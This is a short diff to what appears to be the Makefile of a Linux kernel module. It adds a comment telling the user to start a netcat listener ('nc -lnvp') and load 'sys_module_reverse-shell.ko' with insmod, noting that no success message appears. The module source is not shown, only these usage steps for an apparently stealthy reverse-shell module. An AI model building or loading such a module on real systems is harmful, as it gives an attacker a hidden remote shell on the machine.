@@ -25,6 +25,8 @@ all:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 clean:
 	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
-
-		
-		
+/*
+ * then make it "make"
+ * start your listener with "nc -lnvp xxxx"
+ * and run "insmod sys_module_reverse-shell.ko"  (you will not see any successfull message)
+ */
